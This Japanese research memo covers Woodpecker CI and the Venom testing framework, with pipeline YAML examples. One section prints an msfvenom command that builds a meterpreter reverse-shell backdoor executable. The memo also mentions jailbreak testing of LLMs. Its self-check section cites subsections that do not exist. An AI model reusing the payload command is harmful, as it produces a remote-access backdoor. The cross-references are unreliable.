# WoodpeckerとVenom技術調査

## 概要

本ドキュメントは、Woodpecker CIとVenomテストフレームワークに関する技術調査結果をまとめたものです。両ツールの起源、アーキテクチャ、実装詳細、および統合方法について詳述します。

**調査日**: 2025年12月27日

**調査目的**:
- Woodpecker CIとVenomの技術的詳細を理解
- 両ツールの統合パターンを把握
- 本プロジェクト（2601_venom）での実装を技術的に裏付け

**関連ドキュメント**:
- `03_Research/20251227_01_CIツール選定調査.md` - CI/CDツール全般の比較

## 1. Woodpecker CI：技術詳細

### 1.1 プロジェクトの起源

**Drone CIからのフォーク背景**:
- Drone CI v0.8まで: Apache 2.0ライセンス（完全OSS）
- Drone CI v1.0以降: Polyform Small Business License（一部プロプライエタリ）
- 2019年4月: Drone CI v0.8をベースにフォーク開始
- 2019年8月: プロジェクト名を「Woodpecker」に変更

**フォークの理由**:
1. ライセンス変更による商用利用制限への懸念
2. Harness社による買収とベンダーロックインのリスク
3. 完全なオープンソースCI/CDエンジンの必要性
4. コミュニティ主導の開発継続

**比較表**:

| 特性 | Drone CI (Harness) | Woodpecker CI (Community) |
|------|-------------------|---------------------------|
| ライセンス | Polyform / Enterprise | Apache 2.0 |
| 開発主体 | Harness社 | コミュニティ主導 |
| コスト | ビルド数制限・課金あり | 完全無料・無制限 |
| 採用事例 | 企業向け | Codeberg等のOSSプラットフォーム |

### 1.2 アーキテクチャ

Woodpecker CIは**Server**と**Agent**の2つの主要コンポーネントで構成されます。

#### 1.2.1 Server コンポーネント

**役割**:
- VCS連携（GitHub, GitLab, Gitea, Forgejo, Bitbucket）
- OAuth2によるユーザー認証
- Webhookイベント受信（Push, Pull Request, Tag作成）
- パイプライン管理（`.woodpecker.yml`解析、タスクキュー管理）
- データベース管理（ビルド履歴、ログ、シークレット）
- Web UI提供（ビルド状況可視化、手動実行）

**サポートデータベース**:
- SQLite（デフォルト、軽量運用向け）
- MySQL / PostgreSQL（大規模運用向け）

**通信プロトコル**:
- gRPC（Google Remote Procedure Call）を使用してAgentと通信

#### 1.2.2 Agent コンポーネント

**役割**:
- Serverへのロングポーリング（タスク取得）
- コンテナランタイム（Docker）の操作
- パイプラインステップの実行

**コンテナ・パー・ステップ方式**:
```
従来のCI: VM/コンテナ内で複数ステップを連続実行
          ┌─────────────────────────┐
          │ VM/Container            │
          │  - build.sh             │
          │  - test.sh              │
          │  - deploy.sh            │
          └─────────────────────────┘

Woodpecker: 各ステップで新しいコンテナを起動
          ┌──────────┐  ┌──────────┐  ┌──────────┐
          │Container1│  │Container2│  │Container3│
          │ - build  │  │ - test   │  │ - deploy │
          └──────────┘  └──────────┘  └──────────┘
```

**利点**:
- ステップ間の完全な隔離
- 各ステップで最適なツールセット（Node.js, Go, Python等）を使い分け可能
- 環境の再現性向上

**ワークスペース（共有ボリューム）**:
- パイプライン実行中のみ存在する一時ボリューム
- 全ステップのコンテナにマウント
- ビルド成果物の受け渡しに使用

### 1.3 パイプライン設定（YAML構文）

#### 基本構造

```yaml
pipeline:
  backend-build:
    image: golang:1.21
    commands:
      - go mod download
      - go build -o myapp main.go
      - go test ./...
    environment:
      - CGO_ENABLED=0
    when:
      branch: [ main, develop ]
      event: push

  publish:
    image: plugins/docker
    settings:
      registry: docker.io
      repo: myuser/myapp
      tags: ${CI_COMMIT_SHA:0:8},latest
      username:
        from_secret: DOCKER_USERNAME
      password:
        from_secret: DOCKER_PASSWORD
    when:
      branch: main

  notify:
    image: plugins/slack
    settings:
      webhook:
        from_secret: SLACK_WEBHOOK
      channel: deployments
    when:
      status: [ success, failure ]
```

**構文要素**:
- `pipeline` / `steps`: ステップリスト
- `image`: 実行するDockerイメージ
- `commands`: コンテナ内で実行するシェルコマンド
- `settings`: プラグインへのパラメータ（環境変数`PLUGIN_*`に変換）
- `when`: 条件付き実行（ブランチ、イベント、ステータス）

#### Servicesとサイドカーパターン

依存サービス（DB、Redis等）をサイドカーコンテナとして起動：

```yaml
services:
  database:
    image: postgres:14
    environment:
      - POSTGRES_USER=user
      - POSTGRES_DB=testdb
      - POSTGRES_PASSWORD=secret
    ports:
      - 5432
```

**ネットワーク**:
- サービス名（`database`）をホスト名としてアクセス可能
- Docker Composeのネットワーク機能と類似

### 1.4 プラグインシステム

**重要な設計哲学**: プラグインは特別なバイナリではなく、**単なるDockerコンテナ**

**動作メカニズム**:
1. `settings`セクションの値を環境変数（`PLUGIN_*`）に変換
2. 該当のコンテナイメージを起動
3. 環境変数を注入して実行

**主要プラグイン**:

| プラグイン | 用途 |
|-----------|------|
| `plugins/git` | リポジトリクローン（デフォルト実行） |
| `woodpeckerci/plugin-docker` | Dockerイメージのビルド・プッシュ |
| `woodpeckerci/plugin-s3` | AWS S3/MinIOへのアップロード |
| `woodpeckerci/plugin-codecov` | カバレッジレポート送信 |

**利点**:
- 任意の言語（Go, Python, Bash等）でプラグイン作成可能
- ホスト環境への依存ツールインストール不要

### 1.5 セキュリティ考慮事項

#### Trusted Repositories（信頼されたリポジトリ）

**デフォルト動作**:
- コンテナを非特権モードで実行

**特権モードが必要な場合**:
- Dockerイメージのビルド（Docker-in-Docker）
- ホストのDockerソケットへのアクセス

**管理方法**:
- 管理者がリポジトリを「Trusted」としてマークする必要
- 信頼できるユーザーのリポジトリに限定すべき

#### Secrets Management

**推奨方法**:
- リポジトリ内のファイルに保存しない
- Web UIまたはCLIを通じて暗号化された「Secret」として登録
- 実行時のみ環境変数として注入
- ログ上ではマスク処理

#### 脆弱性対応

**CVE-2024-41121の例**:
- 悪意のあるワークフローによるホスト乗っ取りリスク
- シークレット抽出の可能性

**対策**:
- 定期的なアップデート
- エージェント実行ホストの隔離
- 信頼できないコードの実行環境分離

## 2. Venom：宣言的統合テストフレームワーク

### 2.1 開発背景

**課題**:
- 従来の統合テスト: Python/Goの複雑なコード、または保守困難なBashスクリプト
- 可読性の低さ
- 開発者とQAエンジニア間のスキル断絶

**Venomの解決策**:
- 「Integration Tests as Code（コードとしての統合テスト）」
- YAMLファイルでテストケースを記述
- Go言語製シングルバイナリ
- 依存関係が少なく、CI環境への導入が容易

### 2.2 アーキテクチャ：ExecutorとAssertion

**核となる概念**: 操作（Executor）と検証（Assertion）の分離

#### 2.2.1 豊富なExecutor

| Executor | 用途 |
|----------|------|
| `http` | REST APIテスト（メソッド、ヘッダー、ステータスコード、JSONレスポンス） |
| `exec` | シェルコマンド実行（CLIツールテスト、セットアップ/ティアダウン） |
| `sql` / `dbfixtures` | DB接続（MySQL, PostgreSQL, Oracle）、クエリ実行、フィクスチャ投入 |
| `redis` | Redisキャッシュ操作（キー設定、取得、値検証） |
| `kafka` / `amqp` | メッセージブローカー（Produce/Consume検証） |
| `grpc` | gRPCエンドポイントテスト |
| `smtp` / `imap` | メール送信・受信テスト |
| `web` | Headless Chromeによるブラウザ操作（E2Eテスト） |
| `ssh` | リモートサーバーSSH接続・コマンド実行 |

**利点**: 1つのツールで横断的なテストシナリオを記述可能
```
例: APIを叩き（http）→ DBが更新されたか確認し（sql）→ Kafkaにイベントが飛んだか確認（kafka）
```

#### 2.2.2 宣言的アサーション

**基本構文**:
```yaml
assertions:
  - result.statuscode ShouldEqual 200
  - result.bodyjson.users.name ShouldEqual "Alice"
  - result.timeseconds ShouldBeLessThan 1.5
```

**変数共有機能**:
```yaml
- name: Login
  steps:
    - type: http
      method: POST
      url: https://api.example.com/login
      body: '{"user":"admin","pass":"secret"}'
      assertions:
        - result.statuscode ShouldEqual 200
      # レスポンスからトークンを抽出
      extracts:
        token: result.bodyjson.access_token

- name: Get Profile
  steps:
    - type: http
      method: GET
      url: https://api.example.com/profile
      headers:
        Authorization: "Bearer {{.token}}"
      assertions:
        - result.statuscode ShouldEqual 200
```

### 2.3 高度な統合パターン：Smockerとの連携

**OVHcloudの実践例**:

1. **環境構築**: テスト対象サービス + Smocker（HTTPモックサーバー）
2. **モック定義**: VenomからSmockerの管理APIを叩き、モック定義を登録
3. **テスト実行**: テスト対象サービスがSmocker経由で外部サービスと通信
4. **事後検証**: Smockerの履歴APIで呼び出しパラメータを検証

**利点**:
- 外部依存サービスが不安定でも決定論的なテスト可能
- 課金が発生する外部APIの利用を避けられる
- 完全に閉じた環境でのテスト実現

## 3. Woodpecker CIとVenomの統合

### 3.1 統合パイプライン設計戦略

**一般的なフロー**:

1. **ビルドステージ**: アプリケーションのバイナリ/Dockerイメージ作成
2. **環境セットアップ**: `services`機能で依存ミドルウェア起動
3. **テスト実行ステージ**: `ovhcom/venom`コンテナでテストシナリオ実行
4. **レポート出力**: JUnit形式のXMLレポートをWoodpeckerが解析・表示

### 3.2 実践的設定例

**ファイル構成**:
```
.woodpecker.yml          # パイプライン定義
tests/api_test.yml       # Venomテストスイート
tests/migrate.yml        # DBマイグレーション用Venomテスト
schema.sql               # DB初期化SQL
```

**.woodpecker.yml**:
```yaml
pipeline:
  # 1. DB起動待ち
  wait-for-db:
    image: alpine
    commands:
      - sleep 10

  # 2. DBマイグレーション（Venom経由）
  db-migrate:
    image: ovhcom/venom:latest
    commands:
      - venom run tests/migrate.yml --var db_dsn="postgres://user:pass@database:5432/testdb?sslmode=disable"

  # 3. 統合テスト実行
  integration-tests:
    image: ovhcom/venom:latest
    environment:
      - TARGET_URL=http://myapp:8080
    commands:
      - venom run tests/api_test.yml --var url=$TARGET_URL --format=xml --output-dir=test-results
    when:
      event: [push, pull_request]

# 依存サービス
services:
  myapp:
    image: my-app-image:latest
    ports: [ 8080 ]
    environment:
      - DB_HOST=database
      - DB_USER=user
      - DB_PASS=pass

  database:
    image: postgres:14
    ports: [ 5432 ]
    environment:
      - POSTGRES_USER=user
      - POSTGRES_PASSWORD=pass
      - POSTGRES_DB=testdb
```

**効果**:
- コードの変更ごとにクリーンな環境で自動テスト実行
- データベースを含むフルスタック統合テスト
- 品質の自動担保

## 4. セキュリティ領域での「Woodpecker」「Venom」

### 4.1 Operant AI Woodpecker（セキュリティツール）

**概要**: AI、Kubernetes、APIを対象とした自動レッドチーミングツール

**主な機能**:
- **AI Security**: LLMへの敵対的プロンプト送信、ジェイルブレイクテスト
- **Kubernetes Security**: 設定ミス検出、コンテナエスケープ可能性評価
- **コンプライアンス**: OWASP Top 10、MITRE ATLAS、NIST基準評価

**DevSecOps活用例**:
```yaml
# Woodpecker CI（CIツール）のパイプライン内で
# Operant AI Woodpecker（セキュリティツール）を実行
pipeline:
  security-scan:
    image: operant/woodpecker:latest
    commands:
      - woodpecker scan --target ai-model
      - woodpecker scan --target k8s-cluster
```

### 4.2 VENOM脆弱性 (CVE-2015-3456)

**技術詳細**:
- QEMUの仮想フロッピーディスクコントローラ（FDC）のバッファオーバーフロー
- 影響: KVM, Xen, Oracle VM等の多くのハイパーバイザー
- 脅威: ゲストOSからホストOSへのVMエスケープ

**教訓**:
- レガシーなデバイスエミュレーションコードが最新インフラの脆弱性になり得る
- 攻撃面（Attack Surface）の最小化の重要性

### 4.3 msfvenom（ペネトレーションテストツール）

**概要**: Metasploit Frameworkの攻撃用ペイロード生成ツール

**利用例**:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o backdoor.exe
```

**CI/CD統合の可能性**:
- セキュリティテストの一環としてペイロード生成
- セキュリティソフトの検知率計測

## 5. 本プロジェクト（2601_venom）への適用

### 5.1 採用した構成

**Woodpecker CI**:
- EC2（t3.medium）上でDockerコンテナとして稼働
- GitHub OAuth連携
- 2段階パイプライン（setup-db + test）

**Venom**:
- `ovhcom/venom:latest`をパイプライン内で実行
- DBFixtures（PostgreSQL）とHTTP（API Gateway）のテスト
- YAMLによる宣言的テスト定義

### 5.2 技術的優位性

**コンテナネイティブ**:
- 全ステップがDockerコンテナで実行
- 環境の完全な再現性

**軽量性**:
- Woodpecker Server/Agent: 約200-300MB
- Venom実行時: 約50-100MB
- t3.medium（4GB RAM）で十分に動作

**YAML中心の設定**:
- `.woodpecker.yml`: パイプライン定義
- `tests/*.venom.yml`: テスト定義
- 可読性が高く、保守が容易

### 5.3 実装パターンの技術的裏付け

**本プロジェクトの`.woodpecker.yml`**:
```yaml
pipeline:
  setup-db:
    image: postgres:16
    environment:
      - PGPASSWORD=password123
    commands:
      - psql -h ${DB_ENDPOINT} -U postgres -d testdb -f sql/01_schema.sql
      - psql -h ${DB_ENDPOINT} -U postgres -d testdb -f sql/02_seed.sql

  test:
    image: ovhcom/venom:latest
    commands:
      - venom run tests/*.venom.yml --var "db_url=postgres://..." --var "api_url=https://..."
```

**技術的に正しい設計であることの確認**:
- ✓ ServicesパターンによるDB起動（本調査の2.3.2と一致）
- ✓ Venomによる横断的テスト（本調査の3.2.1と一致）
- ✓ プラグインとしてのコンテナ利用（本調査の1.4と一致）

## 6. 推奨事項

### 6.1 継続的改善

**パイプラインの拡張**:
- カバレッジレポート（`woodpeckerci/plugin-codecov`）
- セキュリティスキャン（Operant AI Woodpecker等）
- マルチステージビルドの導入

**テストの高度化**:
- Smocker導入による外部API依存の排除
- Venomのgprc/kafka executorの活用
- E2Eテスト（web executor）の追加

### 6.2 セキュリティ強化

**Secrets管理の徹底**:
- GitHub Personal Access TokenをWoodpecker Secretsに移行
- DB接続情報の暗号化
- ログのマスキング確認

**脆弱性対応**:
- Woodpecker CI定期アップデート
- 依存コンテナイメージのセキュリティスキャン

## 7. 参考資料

### 公式ドキュメント

- Woodpecker CI公式サイト: https://woodpecker-ci.org/
- Woodpecker CI - Workflow Syntax: https://woodpecker-ci.org/docs/usage/workflow-syntax
- Venom公式リポジトリ: https://github.com/ovh/venom
- OVHcloud Blog - Declarative integration tests: https://blog.ovhcloud.com/declarative-integration-tests-in-a-microservice-environment/

### 技術記事

- CI pipelines with Woodpecker - reinhard.codes
- Easy Integration Testing with Venom! - DEV Community
- Deploy Docker/Compose using Woodpecker CI - hinty.io

### セキュリティ情報

- CVE-2024-41121: Woodpecker CI脆弱性
- CVE-2015-3456: VENOM脆弱性
- Operant AI Woodpecker: https://www.helpnetsecurity.com/2025/05/28/woodpecker-open-source-red-teaming/

---

**文書履歴**:
- 2025-12-27: 初版作成（Gemini調査結果の整理）
